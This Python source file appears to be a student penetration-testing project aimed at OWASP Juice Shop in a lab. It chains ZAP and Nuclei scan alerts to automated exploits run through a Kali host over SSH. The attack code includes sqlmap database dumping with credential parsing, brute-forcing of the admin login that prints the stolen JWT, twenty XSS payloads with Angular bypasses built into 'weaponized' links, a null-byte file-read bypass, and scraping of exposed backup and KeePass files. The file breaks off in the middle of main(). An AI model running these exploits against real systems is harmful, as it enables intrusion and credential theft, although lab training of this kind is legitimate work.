import argparse
import os
import time
from pathlib import Path
from urllib.parse import urlparse

from dotenv import load_dotenv
import paramiko
import threading
import json
import re
import requests

try:
  from zapv2 import ZAPv2
except ImportError as exc:
  raise SystemExit("Missing dependency 'zaproxy'. Install the packages in requirements.txt first.") from exc


DEFAULT_ZAP_PROXY = "http://192.168.190.129:8081"
DEFAULT_POLL_INTERVAL = 2
SQL_INJECTION_NAME = "sql injection"


def parse_args() -> argparse.Namespace:
  parser = argparse.ArgumentParser(
    description="Run a ZAP spider scan followed by an active scan against a target URL.",
  )
  parser.add_argument("target_url", help="Target URL to scan, for example http://localhost:3000")
  parser.add_argument(
    "--poll-interval",
    type=int,
    default=DEFAULT_POLL_INTERVAL,
    help="Seconds to wait between scan progress checks.",
  )
  return parser.parse_args()


def load_settings() -> tuple[str, str]:
  env_path = Path(__file__).with_name(".env")
  load_dotenv(env_path)

  api_key = os.getenv("ZAP_API_KEY", "").strip()
  kali_ip = os.getenv("KALI_IP", "").strip() or "the configured Kali machine"
  return api_key, kali_ip


def validate_target_url(target_url: str) -> str:
  parsed = urlparse(target_url)
  if parsed.scheme not in {"http", "https"} or not parsed.netloc:
    raise ValueError("Target URL must include http:// or https:// and a valid host.")
  return target_url.rstrip("/")


def create_zap_client(api_key: str) -> ZAPv2:
  return ZAPv2(
    apikey=api_key,
    proxies={
      "http": DEFAULT_ZAP_PROXY,
      "https": DEFAULT_ZAP_PROXY,
    },
  )


def wait_for_completion(label: str, status_getter, scan_id: str, poll_interval: int) -> None:
  last_status = None

  while True:
    status = int(status_getter(scan_id))
    if status != last_status:
      print(f"[*] {label} progress: {status}%")
      last_status = status

    if status >= 100:
      print(f"[+] {label} completed.")
      return

    time.sleep(poll_interval)


def wait_for_ajax_spider(zap: ZAPv2, poll_interval: int) -> None:
  last_status = None
  saw_running = False

  time.sleep(poll_interval)

  while True:
    status = str(zap.ajaxSpider.status).strip().lower()
    if status != last_status:
      print(f"[*] AJAX Spider status: {status}")
      last_status = status

    if status == "running":
      saw_running = True
    elif saw_running or status == "stopped":
      print("[+] AJAX Spider completed.")
      return

    time.sleep(poll_interval)


def fetch_all_alerts(zap: ZAPv2) -> list[dict]:
  alerts = []
  start = 0
  count = 500

  while True:
    batch = zap.core.alerts(start=start, count=count)
    alerts.extend(batch)

    if len(batch) < count:
      return alerts

    start += count


def is_sql_injection(alert: dict) -> bool:
  return SQL_INJECTION_NAME in alert.get("alert", "").strip().lower()


def print_alerts(alerts: list[dict]) -> None:
  if not alerts:
    print("[*] No alerts were found.")
    return

  print(f"\n[!] Alerts found: {len(alerts)}")
  for index, alert in enumerate(alerts, start=1):
    print("=" * 80)
    print(f"[ALERT {index}] {alert.get('alert', 'Unknown alert')}")
    print(f"URL: {alert.get('url', 'N/A')}")
    print(f"Risk: {alert.get('risk', 'N/A')}")

    param = alert.get("param", "").strip()
    if param:
      print(f"Parameter: {param}")

    evidence = alert.get("evidence", "").strip()
    if evidence:
      print(f"Evidence: {evidence}")

    description = alert.get("description", "").strip()
    if description:
      print(f"Description: {description}")
  print("=" * 80)


def announce_sqlmap_placeholder(kali_ip: str) -> None:
  print(f"[!] SQL Injection detected. Triggering sqlmap placeholder for Kali machine: {kali_ip}")
  if os.name == "nt":
    os.system(f"echo SQL Injection detected. Would now launch sqlmap on the Kali machine {kali_ip}.")
    return

  os.system(f'echo "SQL Injection detected. Would now launch sqlmap on the Kali machine {kali_ip}."')

def run_remote_sqlmap(target_url: str, param: str, kali_ip: str) -> None:
    print(f"\n[!] Initiating Surgical SQLMap attack on: {target_url}")
    
    # 1. מיקוד דינמי (Targeting)
    # אם יש פרמטר ידוע (מ-ZAP) נתקוף אותו, אחרת נגיד ל-SQLMap לסרוק כל טופס שיש בעמוד
    param_flag = f"-p \"{param}\"" if param else "--forms --crawl=1"
    
    # 2. הרחבת פני השטח של התקיפה (Attack Surface)
    # בנינו פקודה שמאפשרת תקיפות על JSON (--data) ועל Headers, וחשוב מכל: הוספנו תמיכה ברמת סיכון גבוהה יותר וטכניקות עמוקות.
    # --level=3: בודק גם כותרות (Headers) ועוגיות (Cookies).
    # --risk=3: כולל שאילתות UPDATE או OR, מה שמגדיל את הסיכוי למצוא Authentication Bypass (or '1'='1).
    sqlmap_cmd = f"sqlmap -u \"{target_url}\" {param_flag} --batch --level=3 --risk=3 --threads=3 --dump --start=1 --stop=5"
    
    print(f"[*] Executing payload: {sqlmap_cmd}")
    out, err = execute_ssh_command(kali_ip, sqlmap_cmd)
    
    print("\n=== SQLMAP OUTPUT ===")
    print("\n".join(out.split('\n')[-35:])) 
    print("=======================\n")
    
    print("[*] Parsing SQLMap output for credentials...")
    found_creds = False
    
    # 3. חילוץ דינמי של יוזרים וסיסמאות מהטבלה
    table_rows = re.findall(r'\|\s*([a-zA-Z0-9_\.@]+)\s*\|\s*([a-zA-Z0-9_\.@\!]+)\s*\|', out)
    for row in table_rows:
        user, pwd = row
        # מנקים "זבל" כמו מילים שמורות של SQL או קווים, ומשאירים רק יוזרים אמיתיים
        if user.lower() not in ['id', 'username', 'email', 'password', 'pass'] and len(pwd) > 2 and not re.match(r'^[-_]+$', pwd):
            EXPLOIT_CONTEXT["extracted_credentials"].append({"user": user, "pass": pwd})
            found_creds = True
            
    if found_creds:
        print(f"[+] Successfully extracted credentials! Saved to Global Context for Admin Hijacker.")
    else:
        # 4. הבחנה ב-Authentication Bypass גם אם אין טבלה
        # אם SQLMap מצא פגיעות אבל לא הצליח (או לא ניסה) למשוך טבלה, הוא כותב "appears to be injectable".
        # זה רמז עבורנו שה-' or '1'='1 הצליח, גם אם לא קיבלנו יוזר וסיסמה!
        if "appears to be injectable" in out.lower() or "vulnerable" in out.lower():
             print("[!] SQLMap detected a vulnerability (likely Auth Bypass), but could not dump tables.")
             print("[*] Hinting Admin Hijacker to attempt generic bypass payloads (e.g. 'or '1'='1).")
             # נוסיף יוזר דמה עם פיילוד של BYPASS כדי שה-Hijacker ינסה אותו
             EXPLOIT_CONTEXT["extracted_credentials"].append({"user": "admin' or '1'='1--", "pass": "admin"})

    # משחרר את הנעילה של ה-Hijacker
    EXPLOIT_CONTEXT["sqlmap_finished"].set()

def run_remote_dirb(target_url: str, kali_ip: str, results_list: list) -> None:
    print(f"\n[*] Launching Dirb for directory discovery on: {target_url}")
    
    username = os.getenv("KALI_USER", "kali")
    password = os.getenv("KALI_PASSWORD", "kali")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(hostname=kali_ip, username=username, password=password)
        
        dirb_cmd = f"dirb {target_url} -S" 
        print(f"[*] Executing payload: {dirb_cmd}")
        
        stdin, stdout, stderr = ssh.exec_command(dirb_cmd)
        output = stdout.read().decode('utf-8')
        
        print("\n=== DIRB OUTPUT ===")
        print(output)
        print("=====================\n")
        
        # === התוספת החדשה: קריאת הפלט של Dirb והזנתו לנתב ===
        for line in output.split('\n'):
            if line.startswith('+ http'):
                found_url = line.split(' ')[1]
                # מכניסים את הממצא באותו פורמט ש-ZAP עובד איתו!
                results_list.append({
                    "alert": "Exposed Directory",
                    "url": found_url,
                    "risk": "Medium",
                    "source": "Dirb"
                })
        print(f"[+] Dirb scan completed. Fed {len(results_list)} directories to the Router.")
            
    except Exception as e:
        print(f"[-] Directory discovery failed: {e}")
    finally:
        ssh.close()

def run_remote_nuclei(target_url: str, kali_ip: str, results_list: list) -> None:
    print(f"\n[*] Launching Nuclei vulnerability scanner on: {target_url}")
    
    username = os.getenv("KALI_USER", "kali")
    password = os.getenv("KALI_PASSWORD", "kali")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(hostname=kali_ip, username=username, password=password)
        
        # הפקודה הממוקדת שלנו
        nuclei_cmd = f"nuclei -u {target_url} -tags cve,vuln,exposure,misconfig,panel -severity critical,high,medium -rl 50 -c 10 -jsonl"
        print(f"[*] Executing payload: {nuclei_cmd}")
        
        stdin, stdout, stderr = ssh.exec_command(nuclei_cmd)
        
        error_output = stderr.read().decode('utf-8')
        if error_output:
            print(f"\n[-] Nuclei System Logs/Errors:\n{error_output}\n")

        for line in stdout:
            try:
                data = json.loads(line.strip())
                finding = {
                    "alert": data.get("info", {}).get("name", "Nuclei Finding"),
                    "url": data.get("matched-at", target_url),
                    "risk": data.get("info", {}).get("severity", "Unknown").capitalize(),
                    "source": "Nuclei"
                }
                results_list.append(finding)
            except json.JSONDecodeError:
                continue 
                
        print(f"[+] Nuclei scan completed. Found {len(results_list)} issues.")
            
    except Exception as e:
        print(f"[-] Nuclei scan failed: {e}")
    finally:
        ssh.close()

def run_remote_commix(target_url: str, kali_ip: str) -> None:
    print(f"\n[!] Initiating automated Commix OS-Injection attack on: {target_url}")
    
    # === ניקוי ה-URL ===
    # אנחנו מנקים את הפיילוד ש-ZAP שלח, כדי לתת ל-Commix להתחיל את ההזרקות שלו מדף נקי
    clean_url = re.sub(r'q=.*', 'q=1', target_url)
    print(f"[*] Sanitized URL for Commix: {clean_url}")
    
    username = os.getenv("KALI_USER", "kali")
    password = os.getenv("KALI_PASSWORD", "kali")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        print(f"[*] Connecting to Kali ({kali_ip}) via SSH...")
        ssh.connect(hostname=kali_ip, username=username, password=password)
        
        # בניית פקודת התקיפה:
        # --batch: מונע שאלות אינטראקטיביות (Yes/No) שעלולות לתקוע את הסקריפט
        # --current-user: אם ההתקפה מצליחה, תדפיס איזה משתמש מריץ את השרת (לרוב www-data או root)
        # --hostname: ידפיס את שם השרת כדי להוכיח RCE
        # 2>&1: תופס את כל הפלט, גם אם הוא נזרק לערוץ השגיאות
        #commix_cmd = f"commix --url {clean_url} --batch --current-user --hostname 2>&1"
        commix_cmd = f"commix --url {clean_url} --batch -v 3 --current-user --hostname 2>&1"
        print(f"[*] Executing payload: {commix_cmd}")
        
        stdin, stdout, stderr = ssh.exec_command(commix_cmd)
        
        print("\n=== COMMIX REAL-TIME OUTPUT ===")
        # קריאה והדפסה בזמן אמת, בדיוק כמו שעשינו ב-SQLMap
        for line in stdout:
            print(line.strip())
        print("=============================\n")
            
    except Exception as e:
        print(f"[-] Automated Commix attack failed: {e}")
    finally:
        ssh.close()

def run_custom_admin_hijacker(target_url: str, kali_ip: str) -> None:
    print(f"\n[!] Initiating Custom API Attack: Admin Account Hijacking...")
    
    # חילוץ כתובת הבסיס (http://192.168.190.129:3000)
    from urllib.parse import urlparse
    parsed = urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    
    login_api = f"{base_url}/rest/user/login"
    print(f"[*] Targeting Login API: {login_api}")
    
    # רשימת סיסמאות נפוצות (במציאות זה יהיה קובץ של אלפים, פה נשים את הקלאסיות)
    passwords_to_try = ["123456", "password", "admin", "admin123", "admin@123", "root"]
    admin_email = "admin@juice-sh.op" # האימייל הקבוע של מנהל ה-Juice Shop
    
    success = False
    
    for pwd in passwords_to_try:
        print(f"[*] Trying credentials -> {admin_email} : {pwd}")
        
        # מבנה הבקשה ש-Juice Shop מצפה לקבל
        payload = {"email": admin_email, "password": pwd}
        
        try:
            response = requests.post(login_api, json=payload, timeout=5)
            
            # אם קיבלנו 200, הפריצה הצליחה!
            if response.status_code == 200:
                data = response.json()
                token = data.get('authentication', {}).get('token', 'NO_TOKEN')
                print("\n" + "="*40)
                print("[+++] CRITICAL VULNERABILITY EXPLOITED [+++]")
                print("[+] Admin account compromised successfully!")
                print(f"[+] Password found: {pwd}")
                print(f"[+] Admin JWT Token stolen:\n{token}")
                print("="*40 + "\n")
                success = True
                break
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")
            
    if not success:
        print("[-] Brute force failed. Password might be complex.")

# def run_remote_xsstrike(target_url: str, kali_ip: str) -> None:
#     print(f"\n[!] Initiating Advanced XSS Analysis with XSStrike on: {target_url}")
    
#     # חילוץ כתובת הבסיס (http://192.168.190.129:3000)
#     from urllib.parse import urlparse
#     parsed = urlparse(target_url)
#     base_url = f"{parsed.scheme}://{parsed.netloc}"
    
#     # בניית הכתובת הנקייה של ממשק המשתמש (UI) שפגיע ל-XSS
#     clean_url = f"{base_url}/#/search?q=1"
    
#     username = os.getenv("KALI_USER", "kali")
#     password = os.getenv("KALI_PASSWORD", "kali")
    
#     ssh = paramiko.SSHClient()
#     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
#     try:
#         ssh.connect(hostname=kali_ip, username=username, password=password)
        
#         # פקודה ממוקדת על ממשק הלקוח
#         xsstrike_cmd = f"python3 /usr/share/xsstrike/xsstrike.py -u \"{clean_url}\" --timeout 15 --console-log-level INFO 2>&1"
        
#         print(f"[*] Executing XSStrike: {xsstrike_cmd}")
#         stdin, stdout, stderr = ssh.exec_command(xsstrike_cmd)
        
#         print("\n=== XSSTRIKE REAL-TIME OUTPUT ===")
#         for line in stdout:
#             print(line.strip())
#         print("================================\n")
            
#     except Exception as e:
#         print(f"[-] XSStrike attack failed: {e}")
#     finally:
#         ssh.close()

def run_custom_xss_weaponizer(target_url: str, kali_ip: str) -> None:
    print(f"\n[!] Initiating Custom XSS Weaponizer for SPA Architecture...")
    
    from urllib.parse import urlparse, quote
    parsed = urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"

    # 20 פיילודים מובחרים המייצגים וקטורי תקיפה שונים (DOM, Angular Bypasses, HTML5)
    payloads = [
        '<script>alert("XSS_1_Classic")</script>',
        '<img src="x" onerror="alert(\'XSS_2_Image\')">',
        '<svg onload="alert(\'XSS_3_SVG\')">',
        '<iframe src="javascript:alert(\'XSS_4_Iframe\')">',
        '"><script>alert("XSS_5_BreakOut")</script>',
        '\'><script>alert("XSS_6_BreakOut_Single")</script>',
        '<body onload="alert(\'XSS_7_Body\')">',
        '<input autofocus onfocus="alert(\'XSS_8_Input\')">',
        '<details open ontoggle="alert(\'XSS_9_Details\')">',
        '<video><source onerror="alert(\'XSS_10_Video\')"></video>',
        '<audio src="x" onerror="alert(\'XSS_11_Audio\')"></audio>',
        '<a href="javascript:alert(\'XSS_12_Link\')">Click Me</a>',
        '<object data="javascript:alert(\'XSS_13_Object\')"></object>',
        '<<script>alert("XSS_14_DoubleTag")</script>',
        '<script src="data:,alert(\'XSS_15_DataURI\')"></script>',
        '{{constructor.constructor("alert(\'XSS_16_Angular_Bypass\')")()}}',
        '{{$on.constructor("alert(\'XSS_17_Angular_Bypass_2\')")()}}',
        '\\x3Cscript\\x3Ealert("XSS_18_HexEncoded")\\x3C/script\\x3E',
        'javascript://%250Aalert("XSS_19_ProtocolBypass")',
        '<svg/onload=alert("XSS_20_NoSpaces")>'
    ]

    print("[*] Generating 20 Weaponized Links for DOM-based XSS...")
    print("="*80)
    
    for i, payload in enumerate(payloads, 1):
        # קידוד הפיילוד כדי שיוכל לעבור ב-URL ללא שגיאות
        encoded_payload = quote(payload)
        
        # בניית הקישור המורעל שיישלח לקורבן
        weaponized_url = f"{base_url}/#/search?q={encoded_payload}"
        
        print(f"[Payload {i:02d}] {payload}")
        print(f"[Link] -> {weaponized_url}\n")

    print("[+] Weaponization complete.")
    print("[*] Action for CrossGuard-AI: Feed these generated links into the messaging platform to test the detection model.")
    print("="*80 + "\n")

def run_remote_lfi_extractor(target_url: str, kali_ip: str) -> None:
    print(f"\n[!] Initiating Advanced Arbitrary File Read Attack...")
    
    from urllib.parse import urlparse
    parsed = urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    
    username = os.getenv("KALI_USER", "kali")
    password = os.getenv("KALI_PASSWORD", "kali")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(hostname=kali_ip, username=username, password=password)
        
        payload = "/ftp/package.json.bak%2500.md"
        attack_url = f"{base_url}{payload}"
        
        curl_cmd = f"curl -s \"{attack_url}\""
        
        print(f"[*] Executing payload: Extension Bypass (%2500.md) on internal backup file...")
        stdin, stdout, stderr = ssh.exec_command(curl_cmd)
        
        output = stdout.read().decode('utf-8')
        
        if "juice-shop" in output or "dependencies" in output:
            print("\n" + "="*70)
            print("[+++] CRITICAL ARBITRARY FILE READ EXPLOITED [+++]")
            print("[+] Successfully bypassed file extension restrictions!")
            print("[+] Filter evasion successful using Poisoned Null Byte (%2500.md)")
            print("\n[*] Extracted 'package.json.bak' FULL CONTENT:")
            
            # הדפסת כל הקובץ ללא הגבלה!
            for line in output.split('\n'):
                if line.strip():
                    print(f"    {line}")
            print("="*70 + "\n")
        else:
            print("[-] Attack blocked. Output received:")
            print(output[:200]) 
            
    except Exception as e:
        print(f"[-] Attack failed: {e}")
    finally:
        ssh.close()

def run_ftp_data_pillager(target_url: str, kali_ip: str) -> None:
    print(f"\n[!] Initiating Exposed Data Pillager (Security Misconfiguration)...")
    
    import requests
    import re
    from urllib.parse import urlparse
    
    parsed = urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    
    # חיבור לתגלית ש-Dirb מצא עבורנו קודם לכן
    ftp_url = f"{base_url}/ftp/"
    print(f"[*] Exploiting exposed directory: {ftp_url}")
    
    try:
        # שימוש ב-User-Agent רגיל כדי להיראות כמו דפדפן
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        response = requests.get(ftp_url, headers=headers, timeout=10)
        
        # אם התיקייה פתוחה וחשופה לציבור
        if response.status_code == 200:
            # שימוש בביטוי רגולרי (Regex) לחילוץ קבצים מסוכנים (כספות, גיבויים, מסמכים)
            files = re.findall(r'href="([^"]+\.(?:kdbx|bak|md|pdf))"', response.text)
            
            if files:
                print("\n" + "="*70)
                print("[+++] CRITICAL DATA LEAKAGE EXPLOITED [+++]")
                print("[+] Security Misconfiguration bypassed! Exfiltrating sensitive files:")
                
                # הדפסת הקבצים ש"נגנבו" (שימוש ב-set למניעת כפילויות בפלט)
                for f in set(files):
                    print(f"    -> Stolen internal file: {f}")
                    
                # התראה קריטית אם מצאנו את כספת הסיסמאות
                if any(".kdbx" in f for f in files):
                    print("\n[!] FATAL: 'incident-support.kdbx' (KeePass Database) detected!")
                    print("[!] Attackers can download and crack this offline to steal ALL corporate passwords.")
                print("="*70 + "\n")
            else:
                print("[-] Connected to /ftp, but no highly sensitive files were matched.")
        else:
            print(f"[-] Failed to access /ftp. Target might have patched the directory listing.")
            
    except Exception as e:
        print(f"[-] FTP Pillager attack failed: {e}")

EXPLOIT_ROUTER = {
    "sql injection": run_remote_sqlmap,
    # הסרנו את commix כי הוא פחות רלוונטי לאפליקציה הזו
    "cross site scripting": run_custom_xss_weaponizer,

    "path traversal": run_remote_lfi_extractor,

    "exposed directory": run_ftp_data_pillager,
    
    # מכת המחץ המרובעת!
    "injection": [
        run_custom_admin_hijacker,   # פריצת חשבון (Logic)
        run_custom_xss_weaponizer,   # שליטת דפדפן (Client-Side)
        run_remote_lfi_extractor,    # שאיבת קבצי לינוקס (OS-Level)
        run_ftp_data_pillager        # גניבת מידע תאגידי (Misconfiguration)
    ],
}

# def generate_html_report(target_url: str, all_findings: list) -> None:
#     print("\n[*] Generating Final Penetration Testing Report (HTML)...")
#     import time
    
#     # קיבוץ הממצאים של ZAP ו-Nuclei למניעת כפילויות ארוכות
#     unique_findings = {}
#     for finding in all_findings:
#         name = finding.get('alert', 'Unknown Vulnerability')
#         risk = finding.get('risk', 'Informational')
#         source = finding.get('source', 'ZAP')
#         if name not in unique_findings:
#             unique_findings[name] = {'risk': risk, 'count': 1, 'source': source}
#         else:
#             unique_findings[name]['count'] += 1

#     # בניית שורות הטבלה ב-HTML
#     table_rows = ""
#     for name, data in unique_findings.items():
#         table_rows += f"""
#         <tr>
#             <td>{name}</td>
#             <td>{data['risk']}</td>
#             <td>{data['source']}</td>
#             <td>{data['count']}</td>
#         </tr>
#         """

#     html_content = f"""<!DOCTYPE html>
# <html lang="he" dir="rtl">
# <head>
#     <meta charset="UTF-8">
#     <title>דו"ח מסכם - פרויקט סייבר מתקדם</title>
#     <style>
#         body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 0; padding: 0; background-color: #f4f4f4; color: #333; }}
#         .container {{ width: 85%; margin: auto; overflow: hidden; padding: 30px; background: #fff; box-shadow: 0 0 15px rgba(0,0,0,0.1); margin-top: 30px; margin-bottom: 30px; border-radius: 8px; }}
#         h1, h2, h3 {{ color: #2c3e50; }}
#         h1 {{ border-bottom: 4px solid #e74c3c; padding-bottom: 10px; text-align: center; }}
#         h2 {{ border-bottom: 2px solid #ecf0f1; padding-bottom: 5px; margin-top: 40px; }}
#         .critical {{ color: #e74c3c; font-weight: bold; }}
#         .screenshot-placeholder {{ border: 2px dashed #bdc3c7; background-color: #f8f9fa; padding: 50px; text-align: center; color: #7f8c8d; margin: 20px 0; font-style: italic; border-radius: 5px; }}
#         .meta-info {{ background: #34495e; color: #ecf0f1; padding: 20px; border-radius: 8px; margin-bottom: 30px; }}
#         .meta-info p {{ margin: 8px 0; font-size: 1.1em; }}
#         table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
#         th, td {{ border: 1px solid #bdc3c7; padding: 12px; text-align: right; }}
#         th {{ background-color: #ecf0f1; color: #2c3e50; }}
#     </style>
# </head>
# <body>
#     <div class="container">
#         <h1>דו"ח בדיקות חדירה וסריקת פגיעויות אוטומטית</h1>
        
#         <div class="meta-info">
#             <p><strong>פרויקט:</strong> מערכת CrossGuard-AI</p>
#             <p><strong>צוות תקיפה ומחקר:</strong> אורון, עמית, איתי, מאור</p>
#             <p><strong>יעד הסריקה:</strong> {target_url}</p>
#             <p><strong>תאריך הפקה:</strong> {time.strftime("%d/%m/%Y %H:%M:%S")}</p>
#         </div>

#         <h2>1. תקציר מנהלים ומתודולוגיה</h2>
#         <p>דו"ח זה הופק במסגרת פרויקט הגמר בסייבר מתקדם. פיתחנו כלי אוטומטי מבוסס פייתון המשלב מנועי סריקה מתקדמים (OWASP ZAP ו-Nuclei). הכלי מבצע שלב Reconnaissance למיפוי משטח התקיפה, ולאחריו מפעיל נתב (Router) חכם המתרגם את ההתראות לפעולות אקספלויטציה ממוקדות באמצעות כלים כגון SQLMap, Dirb וסקריפטים ייעודיים שנכתבו על ידי הצוות.</p>

#         <h2>2. תוצאות סריקת פגיעויות (ZAP & Nuclei)</h2>
#         <p>להלן ריכוז החולשות שאותרו על ידי מנועי הסריקה הסטטיים והדינאמיים בטרם שלב הניצול (Exploitation):</p>
#         <table>
#             <thead>
#                 <tr>
#                     <th>שם ההתראה / חולשה</th>
#                     <th>רמת סיכון</th>
#                     <th>מקור (סורק)</th>
#                     <th>מספר מופעים</th>
#                 </tr>
#             </thead>
#             <tbody>
#                 {table_rows}
#             </tbody>
#         </table>

#         <h2>3. ממצאי ניצול חולשות (Exploitation)</h2>

#         <h3>3.1 דליית מסד נתונים - חשיפת טבלת משתמשים (SQL Injection)</h3>
#         <p><strong>תיאור:</strong> בעקבות זיהוי הזרקת SQL, המערכת שיגרה את פיילוד ה-SQLMap אשר עקף את מנגנוני ההגנה, פרץ למסד הנתונים SQLite ושאב (Dump) בהצלחה את טבלת המשתמשים במלואה, כולל סיסמאות מגוהבות (Hashed).</p>
#         <div class="screenshot-placeholder">[הכנס כאן צילום מסך של פלט SQLMap מציג את טבלת ה-Users]</div>

#         <h3>3.2 קריאת קבצים שרירותית (Arbitrary File Read / LFI)</h3>
#         <p><strong>תיאור:</strong> באמצעות עקיפת סינון סיומות (Extension Bypass) וטריק Poisoned Null Byte, הצלחנו לשאוב את הקובץ <span class="critical">package.json.bak</span>. קובץ זה מכיל את גרסת המערכת ואת כלל התלויות שלה (Dependencies) במלואן.</p>
#         <div class="screenshot-placeholder">[הכנס כאן צילום מסך של פלט ה-LFI המלא (package.json)]</div>

#         <h3>3.3 חשיפת מידע רגיש (Security Misconfiguration)</h3>
#         <p><strong>תיאור:</strong> כלי ה-FTP Pillager סרק תיקיות חשופות שאותרו על ידי Dirb, וחילץ את קובץ כספת הסיסמאות הארגוני (incident-support.kdbx), אשר פותח פתח לפריצה רוחבית לארגון כולו.</p>
#         <div class="screenshot-placeholder">[הכנס כאן צילום מסך של רשימת הקבצים שנגנבו מה-FTP]</div>

#         <h3>3.4 השתלטות מנהל וגניבת JWT (Broken Access Control)</h3>
#         <p><strong>תיאור:</strong> כלי ה-Admin Hijacker שלנו פוצח את ממשק ה-API וחילץ את סיסמת מנהל המערכת, יחד עם טוקן ה-JWT הראשי המאפשר שליטה מלאה באתר.</p>
#         <div class="screenshot-placeholder">[הכנס כאן צילום מסך של טוקן ה-JWT הגנוב]</div>

#         <h3>3.5 הזרקת פישינג ו-XSS למערכת (CrossGuard-AI Testing)</h3>
#         <p><strong>תיאור:</strong> המערכת ייצרה באופן אוטומטי 20 קישורים מורעלים מבוססי DOM-XSS שעוקפים הגנות Angular. קישורים אלו משמשים לבחינת מודל ה-ML של בוט הדיסקורד שלנו בחסימת איומים בזמן אמת.</p>
#         <div class="screenshot-placeholder">[הכנס כאן צילום מסך של חלונית ה-XSS שקופצת בדפדפן]</div>

#     </div>
# </body>
# </html>"""
    
#     file_name = "Advanced_Cyber_Project_Report.html"
#     try:
#         with open(file_name, "w", encoding="utf-8") as f:
#             f.write(html_content)
#         print(f"\n[+] Professional PDF-ready Report generated successfully: {file_name}")
#         print("[*] INSTRUCTIONS TO CREATE PDF: Double-click the HTML file to open it in your browser, then press Ctrl+P and select 'Save as PDF'.")
#     except Exception as e:
#         print(f"[-] Failed to generate report: {e}")

def ai_report_analyzer(raw_logs: str, target_url: str, findings: list):
    print("\n[AI] Initializing REAL Artificial Intelligence Analysis...")
    print("[AI] Sending terminal logs and scanner findings to LLM for deep context analysis. Please wait...")
    
    try:
        from google import genai
        import os
        import time
        from urllib.parse import urlparse
        
        # טעינת מפתח ה-API
        ai_api_key = os.getenv("GEMINI_API_KEY")
        if not ai_api_key:
            print("[-] Error: GEMINI_API_KEY missing in .env. Cannot perform real AI analysis.")
            return

        client = genai.Client(api_key=ai_api_key)
        
        # === התוספת החסרה: ארגון ממצאי ZAP ו-Nuclei עבור ה-AI ===
        scanner_summary = ""
        unique_findings = {}
        for f in findings:
            name = f.get('alert', 'Unknown Vulnerability')
            risk = f.get('risk', 'Info')
            source = f.get('source', 'ZAP')
            if name not in unique_findings:
                unique_findings[name] = {'risk': risk, 'count': 1, 'source': source}
            else:
                unique_findings[name]['count'] += 1
                
        for name, data in unique_findings.items():
            scanner_summary += f"- {name} | Risk: {data['risk']} | Source: {data['source']} | Count: {data['count']}\n"
            
        if not scanner_summary:
            scanner_summary = "No pre-exploitation scanner findings recorded."

        # === בניית הפרומפט המנחה (Prompt Engineering) המעודכן ===
        prompt = f"""
        You are an expert Cybersecurity Analyst.
        I am providing you with the data from an automated penetration test conducted against: {target_url}.
        The test was done for the CrossGuard-AI project.
        
        You must generate a professional, comprehensive Penetration Testing Report in HTML format.
        
        CRITICAL INSTRUCTIONS:
        1. The report MUST be written in Hebrew (עברית).
        2. Use <html lang="he" dir="rtl">.
        3. Include professional CSS styling (dark headers, clean tables, red text for critical findings).
        4. The report must contain these sections exactly:
           - תקציר מנהלים (Executive Summary): Summary of the automated process (Scanners -> Router -> Exploits).
           - ממצאי סריקה ראשונית (ZAP & Nuclei): Create a clean HTML table summarizing the "Scanner Findings" provided below. Show the vulnerability name, risk level, source scanner, and count.
           - ממצאי תקיפה מפורטים (Exploitation Phase): Extract the precise successes from the "Raw Terminal Logs" (e.g., SQLMap tables, FTP stolen files, specific JWT token, LFI package.json details). Give each exploit a proper title.
           - מסקנות והמלצות (Recommendations): How to fix the identified issues in the system.
        5. Return ONLY the raw HTML code. Do not wrap it in markdown blocks (like ```html).

        === SCANNER FINDINGS (ZAP & Nuclei) ===
        {scanner_summary}

        === RAW TERMINAL LOGS (Exploitation Phase) ===
        {raw_logs}
        """
        
        # שליחת הבקשה
        response = client.models.generate_content(
            model='gemini-2.5-flash',
            contents=prompt,
        )
        
        html_output = response.text.strip()
        
        # ניקוי שאריות Markdown
        if html_output.startswith("```html"):
            html_output = html_output[7:]
        elif html_output.startswith("```"):
            html_output = html_output[3:]
        if html_output.endswith("```"):
            html_output = html_output[:-3]
            
        # שמירת הקובץ
        domain = urlparse(target_url).netloc.replace(".", "_").replace(":", "_")
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        file_name = f"Real_AI_Report_{domain}_{timestamp}.html"
        
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(html_output)
            
        print(f"\n[+++] AI Analysis Complete! [+++]")
        print(f"[+] The AI successfully parsed both Scanners and Exploits into the HTML report.")
        print(f"[+] Report saved to: {file_name}")
        
    except ImportError:
        print("\n[-] Error: The 'google-genai' package is not installed.")
    except Exception as e:
        print(f"[-] AI Generation failed: {e}")

def main() -> int:
  args = parse_args()

  # איסוף לוגים ל-AI (נשאר ללא שינוי)
  terminal_logs = ""
  import builtins
  original_print = builtins.print

  def custom_print(*print_args, **kwargs):
      nonlocal terminal_logs
      msg = " ".join(str(a) for a in print_args)
      terminal_logs += msg + "\n"
      original_print(*print_args, **kwargs)

  builtins.print = custom_print

  try:
    target_url = validate_target_url(args.target_url)
  except ValueError as exc:
    builtins.print = original_print
    print(f"[-] {exc}")
    return 1

  api_key, kali_ip = load_settings()
  if not api_key:
    builtins.print = original_print
    print("[-] Missing ZAP_API_KEY in security-tool/.env.")
    return 1

  try:
    print(f"\n[*] [PHASE 1] Starting Parallel Scans on: {target_url}")
    
    # הפעלת Nuclei
    nuclei_alerts = []
